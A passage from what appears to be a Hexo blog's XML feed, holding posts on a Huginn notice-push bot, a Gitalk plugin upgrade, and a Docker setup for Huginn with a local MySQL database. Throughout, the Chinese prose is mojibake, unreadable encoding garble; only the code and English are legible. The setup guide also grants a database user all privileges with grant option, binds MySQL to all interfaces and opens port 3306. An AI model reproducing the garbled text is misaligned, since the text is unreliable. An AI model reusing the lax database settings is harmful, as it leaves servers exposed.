å°±ä¼šæ´¾å‡ºä¸€ä¸ªAgentå°å…µï¼Œå»çœ‹ä¸€çœ‹æ•™åŠ¡æœ‰æ²¡æœ‰æ–°çš„é€šçŸ¥å…¬å‘Šã€‚</p><p>å™¢æ¥äº†å‘€ï¼Agentå¸¦å›æ¥äº†ä¸€ä¸ªæ–°çš„Eventï¼Œå¿«æŠŠå®ƒæ¨ç»™ä¸»äººå§ï¼</p><p>Ding~</p><p>å¾®ä¿¡æ¥äº†ä¸€æ¡æ–°ä¿¡æ¯ã€‚</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WeChatNotification.png" alt="WeChatNotification"></p><p>TGçš„Channelé‚£è¾¹ä¹Ÿæ¥äº†ã€‚</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_PC.png" alt="Telegram PCç«¯"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_Mobile.png" alt="Telegram Mobile"></p><p>å—¯ï¼Œè¿™ä¸ªæ„Ÿè§‰å°±å¾ˆæ£’ï¼Œæœ´å®æ— åï¼Œä¸”æ¯ç‡¥ã€‚ï¼ˆç„¶è€Œå¹¶æ²¡æœ‰é’±</p><p>emmm 24å·å¼€å§‹å°±è¦ç½‘ä¸Šä¸Šè¯¾äº†ã€‚</p><hr><p><strong>ä»¥ä¸Šå†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚</strong></p><p>å™¢å¯¹äº†ï¼ŒTG Channelçš„é‚€è¯·é“¾æ¥åœ¨è¿™ä¸ªåŸŸåé‡Œæ‰¾å˜»å˜»å˜»â€”â€”</p><p><strong><em>_tg_aaonotice.miaotony.xyz</em></strong></p><br><hr><p>å°±åœ¨æˆ‘éƒ¨ç½²è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œå‘ç°æ‰€æœ‰çš„ éä»£ç å—å†…çš„ Liquidè¯­è¨€å…¨éƒ¨è¢«hexoè®¤ä¸ºæ˜¯ä»£ç äº†emmm</p><p>æˆ‘å¿˜è®°hexoä¹Ÿç”¨äº†Liquidäº†ã€‚ã€‚ï¼ˆæ„Ÿè§‰è ¢æ­»äº†</p><p>äºæ˜¯æŠŠéœ€è¦åœ¨æ‰€æœ‰çš„ <code>{{xxx}}</code>å’Œ<code>{% xxx %}</code>å¤–é¢å¥—ä¸€å±‚ <code>{% raw %} ...  {% endraw %}</code><br>å¦‚æœè¦å†™ä¸Šé¢è¿™ä¸ª<code>raw</code>ï¼Œéœ€è¦å†™ä¸¤ä¸ªï¼ˆç±»ä¼¼äºè½¬ä¹‰ï¼‰ã€‚</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/hexo_raw.png" alt="raw"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/hexo_raw2.png" alt="raw2"></p><hr><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><p><a href="https://github.com/huginn/huginn/wiki">Huginn Wiki</a></p></li><li><p><a href="https://github.com/huginn/huginn/wiki/Formatting-Events-using-Liquid">Formatting Events using Liquid</a></p></li><li><p><a href="https://liquid.bootcss.com/">Liquid ä¸­æ–‡æ–‡æ¡£</a></p></li><li><p><a href="https://huginnio.herokuapp.com/agents">Huginn Agent æ–‡æ¡£</a></p></li><li><p><a href="https://core.telegram.org/bots/api">Telegram Botå®˜æ–¹APIæ–‡æ¡£</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/46216545">RSS è¿›é˜¶ç¯‡ï¼šHuginn - çœŸÂ·ä¸ºä»»æ„ç½‘é¡µå®šåˆ¶ RSS æºï¼ˆPhantomJs æŠ“å–ï¼‰</a></p></li><li><p><a href="https://blog.wangjiegulu.com/2018/11/16/douban_high_movie_huginn_telegram/">Huginn å®ç°è‡ªåŠ¨é€šè¿‡ Telegram æ¨é€è±†ç“£é«˜åˆ†ç”µå½±</a></p></li><li><p><a href="https://www.w3.org/TR/xpath/#section-String-Functions">XPath functions</a>ï¼ˆ<a href="https://www.w3school.com.cn/xpath/xpath_functions.asp">ä¸­æ–‡ä»‹ç»</a>ï¼‰</p><p>etc.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> Projects </tag>
            
            <tag> Huginn </tag>
            
            <tag> Telegram </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlogæŠ˜è…¾è®° | å‡çº§Gitalkè¯„è®ºæ’ä»¶ä»¥è§£å†³EmailBombs</title>
      <link href="2020/02/07/Blog_UpdateGitalk/"/>
      <url>2020/02/07/Blog_UpdateGitalk/</url>
      
        <content type="html"><![CDATA[<h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>è¿™å‡ å¤©æˆ‘çš„é‚®ç®±è¢« GitHub è½°ç‚¸äº†emmmã€‚</p><p>å…·ä½“å¤§æ¦‚æ˜¯è¿™æ ·çš„â€”â€”</p><p><img src="/2020/02/07/Blog_UpdateGitalk/GitHubEmail.png" alt="GitHubEmail"></p><p><img src="/2020/02/07/Blog_UpdateGitalk/GitHubEmail2.png" alt="GitHubEmail2"></p><p>è¯´å¥½çš„</p><blockquote><p>Depending on your API usage, weâ€™ll be sending you this email reminder at most once every 3 days.</p></blockquote><p>ç„¶è€Œä»2æœˆ4æ—¥å¼€å§‹æ¯å¤©éƒ½æœ‰ä¸€å †â€¦â€¦</p><p><strong>æ‰€ä»¥è¿™åˆ°åº•æ˜¯ä»€ä¹ˆå›äº‹å‘¢ï¼Ÿ</strong></p><p>æˆ‘ä¸€æƒ³ï¼Œç”¨åˆ°è¿™ä¸ª API çš„åªæœ‰æˆ‘åšå®¢çš„ Gitalk è¯„è®ºæ’ä»¶ã€‚ç›®å‰æˆ‘åšå®¢çš„è¯„è®ºéƒ½æ”¾åœ¨äº†GitHubé¡¹ç›®çš„issueé‡Œï¼Œæ¯ç¯‡æ–‡ç« æµè§ˆåˆ°ä¸‹é¢çš„æ—¶å€™ä¼šè‡ªåŠ¨åŠ è½½è¯„è®ºï¼Œè¿™æ—¶å€™å°±ä¼šå‘GitHubçš„APIå‘è¯·æ±‚ä»è€Œè·å–ç›¸åº”æ•°æ®ã€‚</p><br><hr><h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><p>äºæ˜¯å» gitalk çš„å®˜æ–¹ä»“åº“çœ‹äº†çœ‹ï¼Œæœç„¶2æœˆ4æ—¥å½“å¤©å°±æœ‰äººæissueäº†ï¼Œçœ‹æ¥ä¸å°‘äºº Email Bombs äº†23333ï¼ˆæ‘Šæ‰‹ã€‚</p><p><a href="https://github.com/gitalk/gitalk/issues/343">https://github.com/gitalk/gitalk/issues/343</a></p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue.png" alt="issue"></p><p>å¾ˆå¤šå¤§ä½¬å¯¹è¿™ä¸ªé—®é¢˜è¿›è¡Œäº†è®¨è®ºï¼Œå½“ç„¶ä¹Ÿæœ‰ä¸å°‘ <code>+1 Mark</code>ä¹‹ç±»çš„åœ¨æ—è§‚ã€‚</p><h3 id="æ–¹æ¡ˆä¸€"><a href="#æ–¹æ¡ˆä¸€" class="headerlink" title="æ–¹æ¡ˆä¸€"></a>æ–¹æ¡ˆä¸€</h3><p>2æœˆ4æ—¥è¿™æ ·ï¼Œ@geektutu ç»™å‡ºäº†ä¸€ä¸ª <strong>Use read-only personal access token to replace clientID &amp; clientSecret</strong> çš„æ–¹æ¡ˆï¼Œå¹¶æäº†PRï¼Œè¯¦è§ï¼š<a href="https://github.com/gitalk/gitalk/pull/344">#344</a>ã€‚è¿™ä¸ªPRåœ¨2æœˆ6æ—¥mergeäº†ã€‚</p><p>æ ¹æ®ä»–çš„å»ºè®®ï¼Œé¦–å…ˆéœ€è¦æ›´æ–° <code>gitalk.min.js</code>æ–‡ä»¶ï¼Œå¦‚æœæƒ³è·å¾—æ›´å¤šçš„APIä½¿ç”¨é‡ï¼Œéœ€è¦åœ¨ <a href="https://github.com/settings/tokens">accessToken</a> é‡Œç”Ÿæˆä¸€ä¸ªåªè¯»çš„tokenï¼Œè€Œåä¿®æ”¹ Gitalk æ¨¡æ¿é‡Œçš„é…ç½®ï¼Œæ–°å¢<code>accessToken</code>é¡¹ã€‚</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> gitalk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Gitalk</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  clientID<span class="token operator">:</span> <span class="token string">'GitHub Application Client ID'</span><span class="token punctuation">,</span>  clientSecret<span class="token operator">:</span> <span class="token string">'GitHub Application Client Secret'</span><span class="token punctuation">,</span>  accessToken<span class="token operator">:</span> <span class="token string">'Github Personal Access Token'</span><span class="token punctuation">,</span>   <span class="token comment">// IMPORTANT !!!</span>  repo<span class="token operator">:</span> <span class="token string">'GitHub repo'</span><span class="token punctuation">,</span>  owner<span class="token operator">:</span> <span class="token string">'GitHub repo owner'</span><span class="token punctuation">,</span>  <span class="token operator">...</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>æ ¹æ® <a href="https://developer.github.com/apps/building-oauth-apps/understanding-scopes-for-oauth-apps/#available-scopes">Understanding scopes for OAuth Apps</a> ï¼Œåœ¨<strong>æ–°å»º access token æ—¶ä¸é€‰æ‹©ä»»ä½•é€‰é¡¹</strong>ï¼Œåˆ™ç”Ÿæˆçš„tokenåªæœ‰<strong>å…¬å¼€ä¿¡æ¯çš„åªè¯»</strong>æƒé™ï¼ˆ*Grants read-only access to public information (includes public user profile info, public repository info, and gists)*ï¼‰ã€‚</p><p>6å·æˆ‘ä¹Ÿæ›´æ–°äº†è¿™ä¸€ç‰ˆæœ¬ï¼Œåšäº†ç›¸åº”çš„ä¿®æ”¹ï¼Œçš„ç¡®é‚®ç®±ä¸è¢«è½°ç‚¸äº†ã€‚ğŸ˜‚</p><p>ä½†æ˜¯ï¼Œ<strong>è¿™ä¸ª access token åœ¨ä»»ä½•äººè®¿é—®åšå®¢çš„æ—¶å€™éƒ½æ˜¯å…¬å¼€å¯è§çš„</strong>ï¼Œä¸å…å­˜åœ¨é£é™©ï¼Œè¿™ä¹Ÿåœ¨issueé‡Œæœ‰è¿‡è®¨è®ºã€‚@geektutu ä¹Ÿè¯´è¿™æ˜¯ä¸ªä¸´æ—¶æ–¹æ¡ˆã€‚</p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue2.png" alt="issue2"></p><h3 id="æ–¹æ¡ˆäºŒ"><a href="#æ–¹æ¡ˆäºŒ" class="headerlink" title="æ–¹æ¡ˆäºŒ"></a>æ–¹æ¡ˆäºŒ</h3><p>2æœˆ7æ—¥ï¼Œè¿™ä¸ªissueçš„å‘èµ·è€… @fletchto99 ç»™å‡ºäº†ä»–çš„æ–¹æ¡ˆï¼Œå¹¶æäº†PRï¼Œè¯¦è§ï¼š<a href="https://github.com/gitalk/gitalk/pull/346">gitalk/gitalk#346</a> </p><p><img src="/2020/02/07/Blog_UpdateGitalk/issue3.png" alt="issue3"></p><p>åˆ©ç”¨åŸæ¥çš„<code>client_id</code> å’Œ <code>client_secret</code> ä½œä¸º basic auth æ˜¯å¯è¡Œçš„ã€‚</p><p>æŒ‰ç…§ä»–çš„æ–¹æ¡ˆï¼Œ<strong>ä¸éœ€è¦ä¿®æ”¹å…¶ä»–çš„ä»»ä½•é…ç½®ï¼Œç›´æ¥æŠŠGitalkçš„jså‡çº§åˆ°V1.5.2</strong> å³å¯ã€‚</p><p>è¿™æ ·å°±æ–¹ä¾¿äº†å¾ˆå¤šå“ˆï¼Œè¯•äº†ä¸€ä¸‹æœç„¶æ˜¯å¯è¡Œçš„ã€‚</p><p>è€Œä¸”è¿™ä¸ªå¯ä»¥è¯´æ˜¯<strong>æœ€ä½³æ–¹æ¡ˆ</strong>äº†å‘¢ï¼</p><h2 id="é’ˆå¯¹-Matery-ä¸»é¢˜çš„ä¿®æ”¹"><a href="#é’ˆå¯¹-Matery-ä¸»é¢˜çš„ä¿®æ”¹" class="headerlink" title="é’ˆå¯¹ Matery ä¸»é¢˜çš„ä¿®æ”¹"></a>é’ˆå¯¹ Matery ä¸»é¢˜çš„ä¿®æ”¹</h2><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>å¯¹äºæˆ‘ç°åœ¨ä½¿ç”¨çš„ <a href="https://github.com/blinkfox/hexo-theme-matery">Matery</a> ä¸»é¢˜ï¼ˆ<em>hexo-theme-matery</em>ï¼‰ï¼Œåªéœ€è¦å°† <code>\hexo\themes\matery\source\libs\gitalk</code>ç›®å½•ä¸‹çš„ <code>gitalk.min.js</code>å’Œ <code>gitalk.css</code> æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼ˆ&gt;= V1.5.2ï¼‰å³å¯ã€‚</p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>å½“ç„¶ä¹Ÿå¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶é‡Œå¼•ç”¨çš„ JavaScriptï¼ˆã€CSSï¼‰åœ°å€ä¸ºé“¾æ¥ç‰ˆæœ¬ã€‚</p><p>ç›®å‰ CDN ä¸Šçš„ Gitalk å·²ç»æ›´æ–°åˆ°äº†æœ€æ–°ç‰ˆæœ¬ã€‚</p><p>æ‰“å¼€<code>\hexo\themes\matery\_config.yml</code>ï¼Œä¿®æ”¹å…¶ä¸­çš„ <code>libs</code>ã€‚</p><pre class="language-yml" data-language="yml"><code class="language-yml">libs:  css:    # ...    gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css    # æˆ–è€… https://unpkg.com/gitalk/dist/gitalk.css    # ...  js:    # ...    gitalk: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js    # æˆ–è€… https://unpkg.com/gitalk/dist/gitalk.min.js     # ...</code></pre><p>ä¿å­˜åï¼Œåœ¨ hexo çš„ç›®å½•ä¸‹æ‰§è¡Œ <code>hexo clean &amp;&amp; hexo g</code>ï¼Œå†éƒ¨ç½²å³å¯ã€‚</p><hr><p>æœ€åï¼Œé¡ºæ‰‹ç»™ <em><a href="https://github.com/blinkfox/hexo-theme-matery">hexo-theme-matery</a></em> æäº†ä¸ªPRï¼Œæ›´æ–°äº†è¿™ä¸€ä¾èµ–ï¼Œè¯¦è§  <a href="https://github.com/blinkfox/hexo-theme-matery/pull/318">blinkfox/hexo-theme-matery#318</a> ã€‚</p><p><img src="/2020/02/07/Blog_UpdateGitalk/PR.png" alt="PR"></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> blog </tag>
            
            <tag> Gitalk </tag>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºDockeræ­å»ºHuginn</title>
      <link href="2020/02/03/Server_Huginn/"/>
      <url>2020/02/03/Server_Huginn/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/02/03/Server_Huginn/Huginn.png" alt="Huginn"></p><h2 id="What-is-Huginn"><a href="#What-is-Huginn" class="headerlink" title="What is Huginn?"></a>What is Huginn?</h2><blockquote><p>Huginn is a system for building agents that perform automated tasks for  you online.  They can read the web, watch for events, and take actions  on your behalf.  Huginnâ€™s Agents create and consume events, propagating  them along a directed graph.  Think of it as a hackable version of IFTTT or Zapier on your own server.  You always know who has your data.  You  do.</p></blockquote><blockquote><p>Huginnæ˜¯ä¸€ä¸ªç¥å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªç§äººIFTTTï¼Œä¾‹å¦‚æ­å»ºä»»åŠ¡é‡‡é›†è§¦å‘å¹³å°ï¼Œè‡ªåŠ¨è·Ÿè¿›å®æ—¶æé†’ï¼ˆç”¨Email Slack Telegeram QQ  å¾®ä¿¡æ¥æ”¶æ¨é€ï¼‰ï¼Œå…¨æ–‡ RSS è¾“å‡ºï¼ˆæŠŠä½ å…³æ³¨çš„æ‰€æœ‰ç½‘é¡µè¿›è¡Œ RSS  å…¨æ–‡è¾“å‡ºï¼‰ï¼ŒåŒæ—¶å¯ä»¥æŠŠå„ç§appï¼Œè½¯ä»¶ï¼Œç½‘ç»œæœåŠ¡ï¼Œç½‘ç»œè®¾å¤‡ç­‰é“¾æ¥åœ¨ä¸€èµ·åšä»»åŠ¡è§¦å‘ã€‚ </p></blockquote><p>å®˜æ–¹Githubä»“åº“ï¼š<a href="https://github.com/huginn/huginn">https://github.com/huginn/huginn</a></p><p>è¿™ä¸ªæ˜¯æˆ‘åœ¨ç©çˆ¬è™«çš„æ—¶å€™ï¼Œå¶ç„¶é—´åœ¨ç½‘ä¸Šçœ‹åˆ°çš„ä¸€ä¸ªå·¥å…·ï¼Œèƒ½åšçš„äº‹æƒ…è¿˜ä¸å°‘ï¼Œè§‰å¾—è¿˜æŒºä¸é”™çš„ï¼Œè¿™æ¬¡å°±è¯•ç€æ­å»ºä¸€ä¸‹å§ã€‚  </p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>æ‰‹åŠ¨å®‰è£…çš„è¯ï¼Œéœ€è¦ä¸‹é¢è¿™æ ·ä¸€æ­¥æ­¥æ¥ï¼Œæ„Ÿè§‰å¥½éº»çƒ¦â€¦â€¦ï¼ˆæ‡’</p><blockquote><p>The Huginn installation consists of setting up the following components:   </p><ol><li>Packages / Dependencies</li><li>Ruby</li><li>System Users</li><li>Database</li><li>Huginn</li><li>Nginx</li></ol></blockquote><p>ä½†æ˜¯ï¼ŒHuginnè¿˜æä¾›äº†ä¸€ç§é€šè¿‡dockeræ¥æ­å»ºçš„æ–¹å¼ï¼Œå¯ä»¥å…å»é…ç¯å¢ƒçš„çƒ¦æ¼ï¼Œæ„Ÿè§‰è´¼å¥½~</p><p>å®˜æ–¹çš„æ–‡æ¡£åœ¨<a href="https://github.com/huginn/huginn/blob/master/doc/docker/install.md">è¿™é‡Œ</a>ã€‚</p><h3 id="1-å®‰è£…-Docker"><a href="#1-å®‰è£…-Docker" class="headerlink" title="1. å®‰è£… Docker"></a>1. å®‰è£… Docker</h3><p>å¯ä»¥å‚è€ƒ<a href="https://miaotony.xyz/2020/02/02/Server_Docker/">è¿™é‡Œ</a>ã€‚</p><h3 id="2-å®‰è£…-Huginn"><a href="#2-å®‰è£…-Huginn" class="headerlink" title="2. å®‰è£… Huginn"></a>2. å®‰è£… Huginn</h3><p>æœ€ç®€å•çš„å°±ç›´æ¥</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run -it -p <span class="token number">3000</span>:3000 huginn/huginn</code></pre><p>é¦–å…ˆä¼šæŠŠ<code>huginn</code>ç»™pullä¸‹æ¥ï¼Œç„¶åè¿è¡Œã€‚</p><p>ç„¶åè®¿é—® <a href="http://localhost:3000/">http://localhost:3000</a> å¯ä»¥çœ‹åˆ°</p><p><img src="/2020/02/03/Server_Huginn/Huginn2.png" alt="ç™»å½•ç•Œé¢"></p><h3 id="3-ç™»å½•"><a href="#3-ç™»å½•" class="headerlink" title="3. ç™»å½•"></a>3. ç™»å½•</h3><p>åˆ©ç”¨username <code>admin</code> and password <code>password</code>ç™»å½•ï¼Œä¹‹åå¯ä»¥åœ¨<code>Account</code>é‡Œè¿›è¡Œä¿®æ”¹ã€‚</p><p><img src="/2020/02/03/Server_Huginn/Huginn3.png" alt="ç™»å½•åé¦–é¡µ"></p><h3 id="4-é…ç½®å¼€æœºè‡ªå¯"><a href="#4-é…ç½®å¼€æœºè‡ªå¯" class="headerlink" title="4. é…ç½®å¼€æœºè‡ªå¯"></a>4. é…ç½®å¼€æœºè‡ªå¯</h3><pre class="language-bash" data-language="bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always huginn</code></pre><p>å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥<strong>å°½æƒ…æ„Ÿå—<code>huginn</code>çš„é­…åŠ›</strong>äº†ï¼</p><br><hr><br><h2 id="Connect-to-local-MySQL"><a href="#Connect-to-local-MySQL" class="headerlink" title="Connect to local MySQL"></a>Connect to local MySQL</h2><p>ä¸Šé¢çš„å®‰è£…æ–¹æ³•æ˜¯æœ€ç®€å•çš„ï¼Œé»˜è®¤ä¼šåœ¨Dockerå®¹å™¨é‡Œå®‰è£…MySQLæ•°æ®åº“ç­‰ç¯å¢ƒã€‚</p><p>ä½†æ˜¯å¦‚æœæœ¬æœºå°±è£…äº†ä¸€ä¸ªMySQLæ•°æ®åº“ï¼Œéœ€è¦ huginn å…±äº«çš„è¯ï¼Œ</p><p>æˆ–è€…è¯´<strong>æƒ³è¦<code>huginn</code>è¿æ¥åˆ°æœ¬åœ°æ•°æ®åº“</strong>ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·å®‰è£…ã€‚</p><h3 id="1-å®‰è£…-Docker-1"><a href="#1-å®‰è£…-Docker-1" class="headerlink" title="1. å®‰è£… Docker"></a>1. å®‰è£… Docker</h3><p>åŒä¸Šã€‚</p><h3 id="2-é…ç½®-MySQL"><a href="#2-é…ç½®-MySQL" class="headerlink" title="2. é…ç½® MySQL"></a>2. é…ç½® MySQL</h3><h4 id="2-1-ä¿®æ”¹ç»‘å®šçš„IPä¸º-0-0-0-0"><a href="#2-1-ä¿®æ”¹ç»‘å®šçš„IPä¸º-0-0-0-0" class="headerlink" title="2.1 ä¿®æ”¹ç»‘å®šçš„IPä¸º 0.0.0.0"></a>2.1 ä¿®æ”¹ç»‘å®šçš„IPä¸º <code>0.0.0.0</code></h4><p>è¿™æ˜¯ä¸ºäº†è®©dockerèƒ½è¿æ¥åˆ°æœ¬åœ°çš„æ•°æ®åº“ã€‚</p><p>é»˜è®¤çš„ <code>127.0.0.1</code> åªèƒ½ä»æœ¬åœ°è®¿é—®ã€‚</p><p><strong>MySQLï¼š</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/mysql/mysql.conf.d/mysqld.cnf</code></pre><p>ä¿®æ”¹</p><pre class="language-none"><code class="language-none">bind-address = 0.0.0.0</code></pre><p>ç„¶å é‡å¯</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysql </code></pre><p><strong>MariaDBï¼š</strong></p><p><code>/etc/mysql/mariadb.cnf</code>åŒ…å«äº†ä¸‹é¢çš„æ‰€ä»¥<code>.cnf</code>æ–‡ä»¶</p><pre class="language-none"><code class="language-none">!includedir /etc/mysql/conf.d/!includedir /etc/mysql/mariadb.conf.d/</code></pre><p>æˆ‘è¿™é‡Œçš„åœ¨ä¸‹é¢è¿™ä¸ªæ–‡ä»¶é‡Œ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/mysql/mariadb.conf.d/50-server.cnf</code></pre><p>åŒæ ·ä¿®æ”¹ <code>bind-address = 0.0.0.0</code></p><p>è€Œå é‡å¯</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart mysql</code></pre><h4 id="2-2-MySQLé‡Œæ–°å»º-huginn-ç”¨æˆ·"><a href="#2-2-MySQLé‡Œæ–°å»º-huginn-ç”¨æˆ·" class="headerlink" title="2.2 MySQLé‡Œæ–°å»º huginn ç”¨æˆ·"></a>2.2 MySQLé‡Œæ–°å»º <code>huginn</code> ç”¨æˆ·</h4><p><strong>å½“ç„¶ä¹Ÿå¯ä»¥è®©<code>huginn</code>ç›´æ¥ä»¥<code>root</code>ç”¨æˆ·æ¥è®¿é—®æ•°æ®åº“ï¼Œé‚£å°±ç›´æ¥è·³åˆ°2.3èŠ‚ã€‚</strong></p><p>ä¸è¿‡å®‰å…¨èµ·è§ï¼Œè¿˜æ˜¯æ–°å»ºä¸€ä¸ªç”¨æˆ·å§ã€‚</p><p>ä»¥<code>root</code>ç™»å½•MySQL / MariaDB</p><pre class="language-bash" data-language="bash"><code class="language-bash">mysql -u root -p</code></pre><p>æ–°å»º<code>huginn</code>ç”¨æˆ·ï¼Œå¯†ç ä¸º<code>PASSWORD</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">create user 'huginn'@'%' identified by 'PASSWORD';</code></pre><p>è¿™ä¸ªæ˜¯å…è®¸ä»ä»»æ„åœ°æ–¹ç™»å½•ã€‚</p><p>å¦‚æœè¦é™åˆ¶ä»<code>docker</code>é‡Œå¯åŠ¨ï¼Œå…ˆ<code>ifconfig</code>çœ‹ä¸‹ <code>docker0</code> çš„IPï¼Œä¸€èˆ¬æ˜¯<code>172.17.0.1</code>ï¼Œåˆ™ docker IP ä¸º<code>172.17.0.*</code>ï¼Œäºæ˜¯</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">create user 'huginn'@'172.17.0.%' identified by 'PASSWORD';</code></pre><h4 id="2-3-èµ‹äºˆæƒé™"><a href="#2-3-èµ‹äºˆæƒé™" class="headerlink" title="2.3 èµ‹äºˆæƒé™"></a>2.3 èµ‹äºˆæƒé™</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">GRANT ALL PRIVILEGES ON *.* TO 'huginn'@'172.17.0.%' IDENTIFIED BY 'PASSWORD' WITH GRANT OPTION;flush privileges;</code></pre><p>å¦‚æœé™åˆ¶è®¿é—®çš„æ•°æ®åº“åˆ™ä¿®æ”¹<code>*.*</code>ä¸ºç›¸åº”çš„æ•°æ®åº“å³å¯ã€‚</p><h3 id="3-é…ç½®-firewall"><a href="#3-é…ç½®-firewall" class="headerlink" title="3. é…ç½® firewall"></a>3. é…ç½® firewall</h3><p>å¦‚æœå¯ç”¨äº† firewall çš„è¯ï¼Œéœ€è¦æ”¾è¡Œæœ¬åœ°çš„3306ç«¯å£ï¼ˆå³æ•°æ®åº“çš„ç›¸åº”ç«¯å£ï¼‰ã€‚</p><p>Ubuntuï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow <span class="token number">3306</span></code></pre><p>CentOSï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">3306</span>/tcp --permanent  <span class="token comment"># å¼€æ”¾ç«¯å£</span><span class="token function">sudo</span> systemctl restart firewalld.service    <span class="token comment"># é‡å¯firewall</span></code></pre><h3 id="4-å®‰è£…-Huginn"><a href="#4-å®‰è£…-Huginn" class="headerlink" title="4. å®‰è£… Huginn"></a>4. å®‰è£… Huginn</h3><p>é¦–æ¬¡å®‰è£…ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run  --name huginn <span class="token punctuation">\</span>    -p <span class="token number">3000</span>:3000 <span class="token punctuation">\</span>    --restart always <span class="token punctuation">\</span>    -e <span class="token assign-left variable">MYSQL_PORT_3306_TCP_ADDR</span><span class="token operator">=</span><span class="token number">172.17</span>.0.1 <span class="token punctuation">\</span>    -e <span class="token assign-left variable">HUGINN_DATABASE_NAME</span><span class="token operator">=</span>huginn <span class="token punctuation">\</span>    -e <span class="token assign-left variable">HUGINN_DATABASE_USERNAME</span><span class="token operator">=</span>huginn <span class="token punctuation">\</span>    -e <span class="token assign-left variable">HUGINN_DATABASE_PASSWORD</span><span class="token operator">=</span>PASSWORD <span class="token punctuation">\</span>    huginn/huginn</code></pre><p>è¿™é‡Œå»ºäº†ä¸€ä¸ªåä¸º<code>huginn</code>çš„æ•°æ®åº“ã€‚</p><p><code>172.17.0.1</code>æ˜¯æœ¬åœ°çš„IPï¼Œå³åœ¨<code>ifconfig</code>çœ‹åˆ°çš„ <code>docker0</code> çš„IPã€‚ç¡®ä¿åœ¨æœ¬åœ°å¯ä»¥é€šè¿‡è¿™ä¸ªIPè¿ä¸Šæ•°æ®åº“ã€‚</p><p>ä¹‹åç›´æ¥è¿™æ ·å³å¯â†“ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker start huginn</code></pre><p>ä¸Šé¢é¦–æ¬¡å®‰è£…æ—¶å·²ç»é…ç½®äº†å¼€æœºè‡ªå¯ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥è¿™æ ·é…ç½®â€”â€”</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always huginn</code></pre><p>å¥½äº†ï¼Œå®Œå·¥ï¼</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/huginn/huginn">https://github.com/huginn/huginn</a></p><p><a href="https://www.jianshu.com/p/d272a09ba686">https://www.jianshu.com/p/d272a09ba686</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Docker </tag>
            
            <tag> tips </tag>
            
            <tag> Huginn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dockerå®‰è£…åŠå¸¸ç”¨å‘½ä»¤</title>
      <link href="2020/02/02/Server_Docker/"/>
      <url>2020/02/02/Server_Docker/</url>
      
